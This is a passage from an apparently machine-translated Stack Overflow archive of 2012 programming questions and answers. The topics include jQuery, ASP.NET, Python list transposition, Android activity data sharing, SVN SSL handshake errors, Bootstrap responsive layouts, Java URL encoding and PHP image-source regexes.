您在配置中创建多个具有不同平台目标的 *.csproj。例如，如果它是一个项目，您将有 2 个 *.csproj 文件，一个用于 .NET 3.5，另一个用于 .NET 4.0。

在配置管理器中，您将为每个版本设置不同的平台。*.csproj(s) 实际上会引用相同的文件。您还可以设置构建条件符号，以便可以针对 .NET 3.5 和 .NET 4.0 定位代码片段。此外，如果您需要重写整个文件，*.csproj(s) 将引用他们自己的文件。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-10T14:49:04.147

If you're planning on writing a family of class libraries that will support multiple .NET frameworks (and/or platforms), you may want to create a "Portable Class Library".

Full details are in the blog post [Targeting Multiple Platforms with Portable Code (Overview)](http://blogs.msdn.com/b/dotnet/archive/2012/07/06/targeting-multiple-platforms-with-portable-code-overview.aspx). In Visual Studio 2012, you simply create a new "Portable Class Library" project, whereas in Visual Studio 2010 you'll need to install the [Portable Library Tools](http://msdn.microsoft.com/en-us/library/gg597391.aspx) first.

With a PCL project, you can target the following platforms:

*   .NET Framework 4, 4.0.3, and 4.5
*   .NET for Metro style apps (which I presume includes Windows Phone 8 and Windows 8 RT)
*   Windows Phone 7.x
*   Silverlight 4 and 5
*   Xbox 360

However, note that .NET Framework 3.5 is not currently included in this list. The Portable Library Tools were written so that other platforms can be added in the future, with Mono support currently at the top of the list.

# javascript - 使用 jQuery 获取选择框 IE 的值。

> ID：11052909
> 
> 赞同：2
> 
> 时间：2012-06-15T14:42:54.297
> 
> 标签：javascript, jquery, internet-explorer

```
var kontrakt = $("#kontrakt_select").find("option:selected").val(); 
```

在 IE(9) 中返回 undefined 但在 Chrome 和 FireFox 中有效

```
<select id="kontrakt_select">
<option value="12345.1">19999.1 - 1992 ABC</option>
</select> 
```

你能解释一下如何在 IE iwth jQuery 中获取选定的值吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T14:18:22.583

首先，这是一个链接，它向您展示了您发布的代码在 IE 7-9 ( jsfiddle.net/FsfDD/ ) 中运行。

也许你在这篇文章中遇到了同样的问题（[jquery 的 .val() 不适用于 IE 上的选择元素](https://stackoverflow.com/questions/3245279/val-of-jquery-not-working-for-select-element-on-ie)）。有一个问题，当 HTML 中的 ID-Attribute 设置为两个或多个元素时，这意味着 ID 不是唯一的，选择器在较旧的 IE 版本中不起作用。（例如 jsfiddle.net/tvmY7/ ）。

# asp.net - 元素内的 ASP.NET Web 窗体元素

> ID：11052915
> 
> 赞同：3
> 
> 时间：2012-06-15T14:43:15.893
> 
> 标签：asp.net, html

我现在有 3 小时的 ASP.NET Web 窗体经验（试用）。我已经习惯了 HTML，所以我需要一些帮助才能开箱即用。

我正在尝试做的是 Element 内部的一个简单元素，但它一直说“该元素未知”。

我需要的是：

```
<ul>
  <li>
    <div>TEST</div>
  </li>
</ul> 
```

我正在尝试的是：

```
<asp:BulletedList ID="BulletedList1" runat="server">
    <asp:ListItem>
        <asp:Panel runat="server">TEST</asp:Panel>
    </asp:ListItem>
</asp:BulletedList> 
```

这不起作用，我想了解为什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:48:46.310

不能在 asp:ListItems 中添加元素，只能设置它们的 Value 和 Text 属性

```
<asp:ListItem Text="Test" Value="Test"></asp:ListItem> 
```

没有真正的理由你不能使用标准的 HTML 控件，这将实现你想要的

```
<ul>
  <li>
    <div id="testDiv" runat="server">TEST</div>
  </li>
</ul> 
```

# python - python导入行为奇怪

> ID：11052916
> 
> 赞同：0
> 
> 时间：2012-06-15T14:43:21.140
> 
> 标签：python, jython, pydev, jython-2.5

我想在我的项目中使用完整的导入名称（参见[这个问题](https://stackoverflow.com/questions/11047086)）。那里描述的问题已经解决，一切正常（**编辑**：如果脚本启动`execfile`）在 eclipse 和 pydev（在 Windows 上运行）之外，在 linux 上的 ccps（内置 jython）中。但是eclipse给了我以下错误：

```
from Project.gui import gui
ImportError: No module named gui 
```

而我的项目结构包括以下内容（没有 .py 的所有内容都是一个文件夹）：

```
Project
    __init__.py
    gui
        __init__.py
        gui.py
    Project.py 
```

我启动 Project.Project.py 并收到上述错误。 `print sys.path`就在关键进口产量之前：

```
['****\\Root\\Project', '****\\Root', 
 *bunch of jars/jython libs*,
'__classpath__', '__pyclasspath__/'] 
```

我正在运行 eclipse 和 PyDev。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T15:05:20.170

因为`\\Root\\Project`在你的路径中，它会首先在 Project 文件夹中`from Project.gui`查看`Project.py`，但随后会抛出错误，因为没有 gui。

您可以在导入之前临时放入`sys.path.insert(0,"****\\Root")`以检查是否是这种情况。但我会`****\\Root\\Project`从你的 PYTHON_PATH 中取出。

那么你可以做

```
from Project import Project 
```

和

```
from Project.gui import gui 
```

# java - 如何存储 ArrayList >

> ID：11052917
> 
> 赞同：1
> 
> 时间：2012-06-15T14:43:22.447
> 
> 标签：java, android, arrays, hashmap

我试图找出存储`ArrayList<HashMap<String, String>>`项目的最佳方式，以便跨活动访问它。在一个活动中，我通过将一系列`HashMap<String, String>`项目添加到 ArrayList 来存储它。

我将如何在另一个活动中访问它？我尝试了 SharedPreferences，但据我所知，它只会将其存储为字符串。有什么建议么？

编辑：我以标签、值的形式将 XML 存储在 HashMap 中

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:56:59.353

你为什么不为此使用[应用程序类](http://developer.android.com/reference/android/app/Application.html)？这样你就可以把数据结构放在那里，它的信息可以在活动之间共享。请注意，应用程序可能会被破坏，并且将其保留在应用程序中意味着您必须将其保存在 sharedprefs 中，或者如果要永久保留它，则必须将其写入磁盘。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:46:15.873

> 我将如何在另一个活动中访问它？

**第一种方式**

*   在第一个 Activity 中将其设为 public static 并在其他 Activity 中访问。

**第二种方式**

*   [如何将列表传递给另一个活动？](https://stackoverflow.com/questions/6087198/passing-a-list-to-another-activity-in-android)

如果您下载 xml 并设置数据，则使用`Bean Concept.`

*   [请参阅此示例](http://samir-mangroliya.blogspot.in/p/android-customized-listview.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:48:46.907

最简单的方法是创建一个单独的类并用静态变量填充它，如下所示：

[http://www.glenmccl.com/tip_002.htm](http://www.glenmccl.com/tip_002.htm)

这样，您可以创建静态方法来根据需要跨活动获取和设置值。

但是，有些人会争辩说，这不像简单地创建一个扩展 Application* 的新类那样安全。如果您决定这样做，那么您还需要在 AndroidManifest.xml 文件中注册扩展。

# objective-c - 如何在 Objective-C 中创建 onEnterFrame 动画？

> ID：11052918
> 
> 赞同：0
> 
> 时间：2012-06-15T14:43:26.803
> 
> 标签：objective-c, core-animation

我正在尝试在 iPad 应用程序中创建交互性。

我想旋转一个图片库，我会使用平移或滑动移动来设置速度并让它随着时间的推移而降低。

由于我来自 Actionscript 世界，我会使用 onEnterFrame 处理程序来执行此操作，但我不知道如何在 Objective-C 中执行此操作

**编辑：我要添加的动作类似于coverflow 菜单。**

**我的问题是：** 如何在每帧（或类似于 onEnterframe ）上执行的方法中有效地执行代码？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T15:40:29.930

既然你在谈论框架，我假设你想为非常框架做 UI 代码。

## 自定义绘制每个“帧”

您*可以*通过实现自定义视图并使用每秒触发 60 次并调用`[self setNeedsDisplay];`. `drawRect:`现在将为每一帧调用您的自定义视图方法。

现在您有了执行每一帧的代码。我会说这可能不是最有效的做事方式，特别是如果你不改变每一帧之间的视图。

## 来自手势识别器的回调

每当用户滑动或平移时，手势识别器都会为您提供回调。如果您只想移动您的视图以响应此问题，那么将您的代码放入这些方法中将可以正常工作。

使用这种方法，您将仅在需要响应更改时执行您的代码。

## 使用核心动画的覆盖流

如果它类似于您尝试做的覆盖流，那么您很可能使用 Core Animation 来做。在这里准确描述如何做到这一点有点复杂，而且我不知道你希望它看起来如何的细节，但网络上有很多很好的资源描述了如何创建像 Cover flow 这样的东西。

一个资源是[Bill Dudney 的 Core Animation 截屏视频](http://pragprog.com/screencasts/v-bdcora/creating-a-compelling-user-interface-with-core-animation)，他在其中使用 Core Aniation 创建了 Cover flow UI。它*已经* 有几年历史了，主要针对 Mac，但其中大部分仍然适用于 iOS。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:52:05.870

[您的答案是在 UIViewController 的 viewWillAppear 方法中](http://developer.apple.com/library/ios/documentation/uikit/reference/UIViewController_Class/Reference/Reference.html#//apple_ref/occ/instm/UIViewController/viewWillAppear%3a)实现它

# jquery - 处理输入文本更改事件

> ID：11052919
> 
> 赞同：5
> 
> 时间：2012-06-15T14:43:27.113
> 
> 标签：jquery, jquery-ui, jquery-plugins

我正在编写一个 jQuery 插件来模拟可编辑的 div。
这是我的代码：

```
(function($){
    $.fn.editable = function(){
        return this.each(function(){
            var $this = $(this).hide();
            var div = $('<div>'+$this.val()+'</div>').show().insertAfter($this).data('input',$this);

            $this.data('div',div);

            div.dblclick(function(){
                $(this).hide();
                $(this).data('input').val($(this).text()).show();
            });
            $this.blur(function(){
                $(this).hide();
                $(this).data('div').html($(this).val()).show();                
            });

            $this.change(function(){
                $(this).data('div').html($(this).val());    
            });
        });
    };

})(jQuery); 
```

到目前为止，[这工作](http://jsfiddle.net/5nZaH/2/)得很好..

现在，我想要做的，但不知道如何，如果隐藏的输入值发生变化，则使 div 文本发生变化。
意味着，如果我这样做`$('#editable').val('new text')`div 应该改变..

我无法手动触发*更改*事件，因为输入更改将发生在我无法控制的其他插件中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-20T06:48:19.243

看看这个，在您的插件中，您可以像这样扩展 val 函数，以便在使用 val 函数更改值时触发更改事件。

[如何扩展 val 方法，以便在调用 val 时触发 change 事件？](http://jqfaq.com/how-to-extend-a-jquery-method-to-inject-some-custom-functionality/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-17T16:23:24.987

当您双击`<div>`编辑 时`<input>`，您将使用以下行覆盖输入的值：

```
$(this).data('input').val($(this).text()).show(); 
```

如果`.change()`事件没有被触发（如您所指出的），则意味着您正在用 div 的“旧”内容覆盖外部插件所做的更改。删除`.val()`以避免该问题。

```
$(this).data('input').show(); 
```

作为依赖外部插件触发的替代方法`.change()`，您可以通过轮询来检查该值。虽然如果事件可用，不建议这样做，但如果合理设置轮询间隔，则不会产生太大影响。由于您正在处理人类以表格形式输入数据，我猜您不需要比每 250 毫秒更频繁地进行轮询。

查看[`$("#editable").changePolling();`](https://gist.github.com/2944926)检查当前值并`.change()`在其已更改时触发的包装器。有关基于您的代码的示例，请参阅[分叉的 jsfiddle 。](http://jsfiddle.net/joelpurra/v8YVQ/)

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-06-15T15:01:05.180

[我建议您按照Plugins/Authoring - Namespacing](http://docs.jquery.com/Plugins/Authoring#Namespacing)中的描述使您的 jQuery 插件支持方法：

然后你会有这样的东西：

```
(function( $ ){

  var methods = {

    init : function( options ) { 
      return this.each(function() {
        var $this = $(this).hide();
        var div = $('<div>'+$this.val()+'</div>').show().insertAfter($this).data('input',$this);

        $this.data('div',div);

        div.dblclick(function(){
            $(this).hide();
            $(this).data('input').val($(this).text()).show();
        });
        $this.blur(function(){
            $(this).hide();
            $(this).data('div').html($(this).val()).show();                
        });
    },

    value : function( str ) {
      return this.each(function(){
        $(this).val(str);
        $(this).data('div').html($(this).val());
      });
    }
  };

  $.fn.editable = function( method ) {

    // Method calling logic
    if ( methods[method] ) {
      return methods[ method ].apply( this, Array.prototype.slice.call( arguments, 1 ));
    } else if ( typeof method === 'object' || ! method ) {
      return methods.init.apply( this, arguments );
    } else {
      $.error( 'Method ' +  method + ' does not exist on jQuery.editable' );
    }    

  };

})( jQuery ); 
```

然后你会像这样使用它：

```
$('#editable').editable('new value that will sync the related div');
// instead of `$('#editable').value('...')` 
```

我强烈建议您阅读[Plugins/Authoring - Namespacing](http://docs.jquery.com/Plugins/Authoring#Namespacing)关于 jQuery 的文章。

* * *

**更新**由于我在理解问题时犯了一个错误，因此我提出了以下建议的解决方案。这不是最好的方法。

**我强烈建议您检查您的插件设计，因为我个人认为它无法访问。**

但是，由于我看不到整个场景，下面的代码就可以了

```
(function() {

    // Store the original jQuery.val()
    var $$val = $.fn.val;

    // Add a hook.
    $.fn.val = function(s) {

      // Call your plugin change event.
      $(this).editable('change');

      // Delegate to the original jQuery.val function.
      return $$val.apply(this, Array.prototype.slice.call(arguments));
    };

  // Your plugin stuff...
}) 
```

高温高压

# python - 在 Python 中创建二维网格

> ID：11052920
> 
> 赞同：1
> 
> 时间：2012-06-15T14:43:29.270
> 
> 标签：python, list, multidimensional-array

我正在尝试在 Python 中创建一个二维数组或列表或其他东西。我对这门语言很陌生，所以我不知道所有的来龙去脉以及不同的类型或库。

基本上，我有一个方形列表 g，我想转置它（将行转换为列，将列转换为行）。稍后我将遍历这个列表列表和列表的转置列表。在转置列表中，列的顺序无关紧要。这是“Python方式”吗？有没有更快的方法来做到这一点？

我喜欢使用列表，因为我对与我所知道的语言中的数组非常相似的语法感到满意，但是如果 Python 中有更好的方法，我想学习它。

```
`def makeLRGrid(g):
    n = []
    for i in range(len(g)):
        temp = []
        for j in range(len(g)):
            temp.append(g[j][i])
        n.append(temp)
    return n` 
```

`感谢您提供的任何帮助！`

 `编辑：很抱歉造成混淆，显然我的意思是转置，而不是反转！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:48:40.627

对于列表的“方形”列表，此实现与您的实现相同：

```
def makeLRGrid(g):
    return [row[:] for row in g] 
```

可以通过使用 切片整个列表来复制列表`[:]`，并且您可以使用列表推导对每一行执行此操作。

**编辑**：您似乎实际上是在[*转置*](http://en.wikipedia.org/wiki/Transpose)列表列表。这可以通过以下方式完成`zip()`：

```
def transpose(g):
    return zip(*g) 
```

或者，如果您真的需要列表列表

```
def transpose(g):
    return map(list, zip(*g)) 
```

另请参阅 的[文档`zip()`](http://docs.python.org/library/functions.html#zip)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-15T14:51:21.323

对于数值编程，我强烈推荐[NumPy](http://numpy.scipy.org/)（以及相关的[SciPy](http://www.scipy.org/)）。NumPy 实现了非常快速[的多维数组](http://docs.scipy.org/doc/numpy/reference/generated/numpy.ndarray.html)。在[这里](http://docs.scipy.org/doc/numpy/reference/routines.array-manipulation.html)查看可用的数组操作例程。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-15T15:15:01.963

为了补充克里斯的评论，我真的不能推荐足够的 numpy。你说它是针对一个项目的，但你可能会为了学习一些（简单的）语法而多次使用它。

例如，如果您有一个列表 g：

```
g = [[1,2,3],[4,5,6],[7,8,9]] 
```

您可以通过以下方式将其变成一个数组：

```
>>> import numpy as np
>>> g_array = np.array(g)
>>> g_array
array([[1, 2, 3],
      [4, 5, 6],
      [7, 8, 9]]) 
```

只需通过以下方式访问任何项目：

```
>>> g_array[0,1]
2
>>> g_array[1,2]
6 
```

并通过以下方式执行您的“反转”（实际上是转置 - 即第一行成为每一行的第一列）：

```
>>> g_transpose = g_array.transpose() # or  = g_array.T from Simon's comment
>>> g_transpose
array([[1, 4, 7],
      [2, 5, 8],
      [3, 6, 9]]) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-15T15:01:59.600

我猜`invert the list of lists`是这样的：

```
g = [[1,2,3], [4,5,6], [7,8,9]]
result = [p[::-1] for p in g]
print result 
```

输出：</p>

```
[[3,2,1], [6,5,4], [9,8,7]] 
```

也许我很担心。你能举一些例子吗？

**编辑：** 对于评论示例

```
result = [list(p) for p in zip(*g)]
print result 
```

输出：

```
[[1,4,7], [2,5,8], [3,6,9]] 
````

# if-statement - 如何在 DIA 的序列图上表示 if 语句？

> ID：11052926
> 
> 赞同：6
> 
> 时间：2012-06-15T14:43:44.873
> 
> 标签：if-statement, uml, sequence-diagram, dia

有谁知道如何在 DIA 的序列图上表示 if 语句？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-08T16:47:51.637

基于[@luistm 给出的 IBM 链接](http://www.ibm.com/developerworks/rational/library/3101.html)中描述的“alt”框，我能够在 Dia 中复制类似的内容：

![UML 序列图与](../Images/d23f68b71eee5b84ead367d24ddb9e17.png)

“alt”框是用 UML 大包对象绘制的。（小包不允许你调整它的大小。）

条件标签只是文本对象（位于左侧工具栏的上方 [静态] 窗格中，用 T 标记）。

虚线只是一个 Line 对象（来自同一个静态工具栏窗格），箭头设置为纯线，主体设置为虚线（在左侧工具窗格的底部完成，带有这 3 个箭头段） .

我不得不使用“对象”菜单项“发送到后面”、“带到前面”、“向后发送”和“向前发送”，以便让一切看起来都正确，而不会相互阻碍。我也不得不经常使用视图菜单的刷新命令来检查自己；通常绘图会弄乱堆叠顺序和重叠，但刷新会使事情再次正确。

它看起来与 IBM 链接上的图表不完全一样（在主框外部而不是内部标注，框边框被生命线阻挡等？），但我认为这是我们可以使用 Dia 的库存 UML 对象做的最好的事情。

# svn - SVN - 握手失败：SSL 错误

> ID：11052927
> 
> 赞同：7
> 
> 时间：2012-06-15T14:43:49.897
> 
> 标签：svn, tortoisesvn, sslhandshakeexception

我无法从直到最近才出现此问题的机器上更新或提交到 svn。我更新了乌龟 svn 客户端。我每次都可以删除文件夹并拉下新副本，但无法提交或更新。

无法通过 URL 连接到存储库

选项 SSL 握手失败：SSL 错误：sslv3 警报非法参数

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-18T16:51:48.650

您几乎可以肯定使用的是旧的 SVN 客户端。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-10T14:06:03.627

我按如下方式解决该问题：

1.  使用 Chrome（或其他允许保存证书的浏览器）到 svn 地址
2.  保存证书文件
3.  将其安装到受信任的根证书中心（可以用其他词命名，我不知道它的英文名称如何）

此外，将 svn 客户端（从 svn 乌龟）更改为另一个也可以解决问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-16T07:25:15.707

可能是防病毒软件破坏了证书。关闭防病毒软件。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-09-15T22:29:44.440

如果访问内部存储库，请尝试关闭 SVN 客户端的代理服务器设置。

为了访问外部 svn 存储库以从 Web 上检出样本，我在 TortoiseSVN 下启用了代理设置。设置->网络->启用代理服务器

但是我忘了禁用它，并且在访问我们的内部仓库时收到了上述错误。这发生在 Tortoise SVN 客户端和 eclipse svn 也无法正常工作。我关闭了代理设置，两者都开始正常工作。

# html - Twitter Bootstrap（响应式）- 特定最小宽度后的附加列

> ID：11052932
> 
> 赞同：3
> 
> 时间：2012-06-15T14:44:06.797
> 
> 标签：html, css, twitter-bootstrap, responsive-design

我正在使用 Twitter Bootstrap 并使用带有媒体查询的流畅设计使其成为响应式设计。

到目前为止，我的设计工作是使用示例 2 列布局来“响应”。但是，我需要做的是在 1200px min-width 之后添加一个额外的侧边栏。

所以如果我的 1024 布局有：

```
<div class="container-fluid">
    <div class="row-fluid">
        <div class="span8">
              .....
        </div>
        <div class="span4 last">
              ..sidebar junk..
        </div>
    </div>
</div> 
```

我需要 1200px 版本才能有效地类似于：

```
<div class="container-fluid">
    <div class="row-fluid">
        <div class="span6">
              .....
        </div>
        <div class="span3">
              ..sidebar junk..
        </div>
        <div class="span3 last">
              ..sidebar 2 junk..
        </div>

    </div>
</div> 
```

或者类似的东西。然后当用户缩小到 1200 像素以下时，删除第二个 span3 并使第一个 span3 再次成为 span4。请参阅[http://www.smashingmagazine.com/](http://www.smashingmagazine.com/)了解我所询问的非常复杂的版本。当您提高屏幕分辨率时，会为内容添加侧边栏。

我们如何用 Bootstrap 来实现这个效果呢？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-15T15:13:01.500

> =用一点 jQuery 很容易做到。

添加和 id 到您的 div，并在准备好和调整大小时添加/删除跨度类和 css。

```
<div class="container-fluid">
  <div class="row-fluid">
    <div id="one">
      .....
    </div>
    <div id="two">
      ..sidebar junk..
    </div>
    <div class="span3" id="three">
      ..sidebar 2 junk..
    </div>
  </div>
</div> 
```

&

```
function sizing() {
  var windowwidth=$(window).width();
  if(windowwidth>=1200){
    $('#one').removeClass('span8').addClass('span6');
    $('#two').removeClass('span4').addClass('span3');
    $('#three').css('display','inline');
  } else {
    $('#one').removeClass('span6').addClass('span8');
    $('#two').removeClass('span3').addClass('span4');
    $('#three').css('display','none');
  }          
}
$(document).ready(sizing);
$(window).resize(sizing); 
```

[http://jsfiddle.net/baptme/9MYTZ/4/](http://jsfiddle.net/baptme/9MYTZ/4/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-06T17:14:25.530

我也一直在为此苦苦挣扎。您可以使用列跨度来模拟这一点。对于 3 列，将跨度设置为 4 (12/4=3)，将 4 列设置为 3。

您可以通过更多的列数获得更多的粒度，比如 24 而不是 12。请参见下面的示例，其中包含多个屏幕尺寸的小列和大列的样式：

```
@grid-columns: 24; 

.small-column {
    .make-xs-column(12); // 2 small columns at xs size (24/2)
    .make-sm-column(6);  // 4 small columns at sm size (24/6)
    .make-md-column(4);  // 6 small columns at md size (24/4)
    .make-lg-column(3);  // 8 small columns at lg size (24/4)
}

.large-column {
    .make-xs-column(24);
    .make-sm-column(12);
    .make-md-column(8);
    .make-lg-column(6); 
} 
```

# canvas - Three.js 全景怪异渲染与画布

> ID：11052940
> 
> 赞同：1
> 
> 时间：2012-06-15T14:44:34.620
> 
> 标签：canvas, three.js

我在使用three.js 的画布渲染器时遇到了问题，我在自己的照片中使用了全景示例，但几何形状似乎并不好。尝试使用不同的参数进行很多操作，例如纹理画布大小，盒子的大小，......但遗憾的是没有好的结果。

这是示例： http: [//prods.mightyprods.com/Three/panoramasimple.php](http://prods.mightyprods.com/Three/panoramasimple.php)

尝试了 webgl 示例，效果很好： http: [//prods.mightyprods.com/Three/skybox.html](http://prods.mightyprods.com/Three/skybox.html)

由于兼容性，我真的需要使用画布元素……知道这有什么问题吗？

提前感谢您的帮助。

PS：对不起我的英语不好...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-16T16:19:52.430

这确实是一个限制`CanvasRenderer`。您可以尝试向立方体添加更多细分或减少相机 fov。

# java - 西班牙语字符和 URISyntaxException

> ID：11052941
> 
> 赞同：2
> 
> 时间：2012-06-15T14:44:36.137
> 
> 标签：java, exception-handling, urlencode

我正在研究西班牙语版本的搜索，当用户输入西班牙语字符（比如 HÍBRIDOS）时，我会看到一些异常（如下所示）。显示我如何在下面编码。发送的 url 是通过网络发送的，如图所示。

`url=http://wwwdev.searchbridg.com/absd/JSONControllerServlet.do?&N=0&Ntk=AllText&Ntt=HÃBRIDOS&Nty=1&Ntx=mode+matchall`

```
 DefaultHttpClient httpClient = new DefaultHttpClient();
    HttpParams params = httpClient.getParams();
    try {
        HttpConnectionParams.setConnectionTimeout(params, 10000);
        HttpConnectionParams.setSoTimeout(params, 10000);
    } catch (Exception e) {
        e.printStackTrace();
        throw e;
    }
    HttpHost proxy = new HttpHost(getProxy(), getProxyPort());
    ConnRouteParams.setDefaultProxy(params, proxy);
    URI uri;
    InputStream data = null;
        uri = new URI(url);
        HttpGet method = new HttpGet(uri);
        HttpResponse response=null;
        try {
        response = httpClient.execute(method);
        }catch(Exception e) {
            e.printStackTrace();
            throw e;
        }
        data = response.getEntity().getContent();
    Reader r = new InputStreamReader(data);
    HashMap<String, Object> jsonObj = (HashMap<String, Object>) GenericJSONUtil.fromJson(r);

java.net.URISyntaxException: Illegal character in query at index 101: http://wwwdev.searchbridge.com/abs/JSONControllerServlet.do?&N=0&Ntk=AllText&Ntt=H├?BRIDOS&Nty=1&Ntx=mode+matchall
    at java.net.URI$Parser.fail(URI.java:2816)
    at java.net.URI$Parser.checkChars(URI.java:2989)
    at java.net.URI$Parser.parseHierarchical(URI.java:3079)
    at java.net.URI$Parser.parse(URI.java:3021)
    at java.net.URI.<init>(URI.java:578) 
```

我尝试使用 UTF-8 编码进行编码，但仍然无法正常工作，显示相同的异常。html页面设置为`<meta charset="utf-8" />`

```
byte[] bytes = url.getBytes("UTF8");
    String stringuRL = new String(bytes,"UTF-8");
        uri = new URI(stringuRL); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:49:55.550

如果您在请求时发送特殊字符（GET 请求），则必须对它们进行 URLescape。查看此线程以了解如何操作。[Java中的HTTP URL地址编码](https://stackoverflow.com/questions/724043/http-url-address-encoding-in-java)

当您收到请求时，您必须执行相反的过程才能获得原始单词。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:59:18.000

get 请求中的所有参数都需要对其值进行编码。

如果您使用的是 HTTPClient 4，您可以或多或少地这样做：

```
List<NameValuePair> parameters = new ArrayList<NameValuePair>();
parameters.add(new BasicNameValuePair("parameter_name_Ã", "another value with ~ãé"));
parameters.add(new BasicNameValuePair("second_parameter", "still other ú û"));
String url = "http://foo.bar/?" + URLEncodedUtils.format(parameters, "UTF-8"); 
```

这个案例的结果将是`http://foo.bar/?parameter_name_%C3%83=another+value+with+%7E%C3%A3%C3%A9&second_parameter=still+other+%C3%BA+%C3%BB`

# php - preg_replace 语法 (img src)

> ID：11052948
> 
> 赞同：0
> 
> 时间：2012-06-15T14:44:45.330
> 
> 标签：php, preg-replace

我正在尝试找到一种方法来定位页面上的所有图像并根据需要修改它们的来源。这是我到目前为止所拥有的：

```
add_filter('the_content','wpdu_image_replace');
function wpdu_image_replace($content) {
    $upload_dir = wp_upload_dir();
    $pattern = '/<img.*src="(.*?)".*?>/';
    $replacement = wpdu_base64_encode_image($upload_dir['path'].'/'.\1);
    return preg_replace( $pattern, $replacement , $content );
} 
```

我有三个问题：

1.  我使用服务器上的相对路径开始'src'标签 - 但没有检查是否：
    1.  该图像确实存在于服务器上
    2.  如果图像有，URL 是否是相对的
2.  我的`$replacement`变量是错误的（我不确定如何输出仅在 src 标记中的内容）
3.  我不想`<img>`在替换中声明标签，因为那样我会丢失它周围的所有其他东西（如类、ID 等）。

有谁知道如何获取图像的来源并以我描述的方式替换它？我已经将[Simple HTML DOM](http://simplehtmldom.sourceforge.net/)视为替代方案——但得到的性能结果很糟糕。任何帮助将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-02T14:52:54.047

1）检查图像是否确实存在于服务器上

```
preg_match_all("!(?<=src\=\").+(?=\"(\s|\/\>))!",$html, $match, PREG_SET_ORDER);

$files = $match;
foreach ($files as $file) {
    if (file_exists($file)) {
       echo "The file $file exists";
       //if image exists you can replace it like: 
       $html = str_replace($file, 'NewImagePath', $html);//$file is the found image source
    } else {
       echo "The file $file does not exist";
    }
} 
```

另一种替换图像的方法：

```
 $html = '<img id="brandLogo" src="chrome://branding/content/about-logo.png" alt=""/>'
  $html = preg_replace('!(?<=src\=\").+(?=\"(\s|\/\>))!', 'newlogo.png',$html ); 
```

此代码找到源代码`chrome://branding/content/about-logo.png`并将其替换为新代码`newlogo.png`

2）要检查路径是相对的还是绝对的，你可以使用php函数`parse_url`

# jquery - 使用 div 中的复选框获取每个 textarea 的值并将它们放在一个数组中

> ID：11052949
> 
> 赞同：0
> 
> 时间：2012-06-15T14:44:48.317
> 
> 标签：jquery

例如我有以下内容：

我想遍历每个 div 类“两者”并将其子属性作为值分配给一个整数数组，包括复选框值，仅当它们为真时。

愚蠢的问题，但我是新来的..

同时，我会看看我是否可以自己想出一个解决方案:)

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:53:58.590

这将为您提供一个包含三个数组的数组，每个 div 一个，包含 textarea 的数据 id，然后是选中复选框的数据 id：

```
var arr = [];
$('.both').each(function() {
  var a = [$('textarea', this).data('id')];
  $(':checked', this).each(function() {
    a.push($(this).data("id"));
  });
  arr.push(a);
}); 
```

示例结果：

```
[[1, 1], [2], [3, 1, 2]] 
```

演示：http: [//jsfiddle.net/Guffa/uF3M6/](http://jsfiddle.net/Guffa/uF3M6/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:50:25.627

```
var values = [];
$('.both').each(function(){
    $(this).find(':checkbox').each(function(){
        if($(this).is(':checked'))
            values.push($(this).attr('data-id'));
    });
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T14:50:52.997

您可以执行以下操作：

```
$(".both").each(function() {
    array[index] = $(this).find("textarea").attr("data-id");
    index = index + 1;

   $(this).find("input[type='checkbox']").each(function() {
        if ($(this).attr("checked")) {
           array[index] = $(this).attr("data-id");
           index = index + 1;
        }
    });
}); 
```

希望这可以帮助！！

# php - Objective-C - 发布请求 + MAMP

> ID：11052951
> 
> 赞同：-1
> 
> 时间：2012-06-15T14:44:52.233
> 
> 标签：php, objective-c, post

我知道已经有一些关于它的答案，但我发誓我仍然没有找到一个明确的答案。我的问题很直接：如何向 PHP 页面发送 POST 请求？

奖励问题：我正在尝试在本地服务器（MAMP）上执行此操作。我需要改变一些东西才能让它工作吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T16:03:14.657

像这样的东西应该工作：

```
NSURL *requestURL = [NSURL URLWithString:@"127.0.0.1/index.php?id=0"];
NSURLRequest *request = [NSURLRequest requestWithURL:requestURL];

NSURLConnection *connection = [NSURLConnection connectionWithRequest:request delegate:self]; 
```

/编辑

对不起，我刚刚看到你在 POST 之后，而不是 GET，这样的东西应该可以工作：

[NSURLConnection 与 POST](http://forums.macrumors.com/showpost.php?p=7501837&postcount=2)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T17:22:47.397

这是我的做法。注意：这是一个同步请求；您也可以以异步方式执行此操作。后者对于云服务器来说是更好的风格，但对于本地服务器不会有太大的区别。

